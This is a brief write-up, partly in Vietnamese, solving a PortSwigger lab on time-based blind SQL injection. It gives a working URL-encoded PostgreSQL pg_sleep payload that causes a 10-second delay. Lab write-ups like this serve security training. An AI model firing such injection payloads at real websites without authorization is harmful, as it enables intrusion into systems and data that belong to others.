# Target Goal: 

To solve the lab, exploit the SQL injection vulnerability to cause a 10 second delay.

# Recon:

Bài lab này chỉ cần cho hàm delay time được kích hoạt để chứng minh được việc Sqli thành công 

Sử dụng payload lần lượt trong [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) để check xem version db mà server sử dụng

`'+||+(SELECT+pg_sleep(10))--a`

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/2b302394-c687-4787-9451-19355ffdc177)
